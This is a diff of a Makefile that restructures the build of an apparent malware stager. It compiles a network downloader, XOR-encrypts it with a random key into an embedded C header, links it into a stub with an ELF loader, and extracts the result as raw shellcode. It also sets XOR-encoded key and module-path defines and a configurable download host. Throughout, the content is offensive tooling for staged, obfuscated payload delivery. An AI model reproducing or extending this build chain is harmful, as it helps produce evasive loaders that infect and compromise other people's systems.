@@ -10,7 +10,7 @@ endif
 
 # Add -Wl,--gc-sections
 LDFLAGS = -nostdlib -static -Wl,-Ttext-segment=0x10000000 -s -Wl,--gc-sections
-
+DL_LDFLAGS = -nostdlib -static -pie -Wl,--gc-sections -Wl,--no-dynamic-linker -s
 
 # Default configuration (can be overridden by environment variables)
 DOWNLOAD_HOST ?= 127.0.0.1
@@ -41,21 +41,46 @@ CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
 CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
 CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 
-SRCS = main.c utils.c aes.c elf_loader.c tinflate.c
+DL_SRCS = downloader.c net_utils.c aes.c tinflate.c utils.c
+STUB_SRCS = stub.c elf_loader.c utils.c
+
+DL_TARGET = downloader
+DL_BIN = downloader.bin
+DL_BLOB_H = downloader_blob.h
+
 TARGET = stager
 SHELLCODE = stager.bin
 
-.PHONY: all clean $(TARGET)
+.PHONY: all clean
 
-all: $(TARGET) $(SHELLCODE)
+all: $(SHELLCODE)
 
-$(TARGET):
-	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $(SRCS)
+$(DL_TARGET): $(DL_SRCS)
+	$(CC) $(CFLAGS) $(DL_LDFLAGS) -o $@ $(DL_SRCS)
+
+$(DL_BIN): $(DL_TARGET)
+	cp $(DL_TARGET) $@
+
+$(DL_BLOB_H): $(DL_BIN)
+	@echo "Generating encrypted blob header..."
+	@python3 -c "import os, random; \
+	key = [random.randint(0, 255) for _ in range(16)]; \
+	data = open('$(DL_BIN)', 'rb').read(); \
+	enc_data = bytes([b ^ key[i % 16] for i, b in enumerate(data)]); \
+	print('#ifndef DOWNLOADER_BLOB_H'); \
+	print('#define DOWNLOADER_BLOB_H'); \
+	print('static const unsigned char downloader_key[] = { ' + ', '.join(hex(b) for b in key) + ' };'); \
+	print('static const unsigned int downloader_bin_len = ' + str(len(data)) + ';'); \
+	print('static const unsigned char downloader_bin[] = { ' + ', '.join(hex(b) for b in enc_data) + ' };'); \
+	print('#endif')" > $@
+
+$(TARGET): $(STUB_SRCS) $(DL_BLOB_H)
+	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $(STUB_SRCS)
 
 $(SHELLCODE): $(TARGET)
 	objcopy -O binary -j .init -j .text -j .rodata -j .data $(TARGET) $@
 	@echo "Shellcode generated at $(PWD)/$@"
+	@wc -c $@
 
 clean:
-	rm -f $(TARGET) $(SHELLCODE)
-
+	rm -f $(TARGET) $(SHELLCODE) $(DL_TARGET) $(DL_BIN) $(DL_BLOB_H)
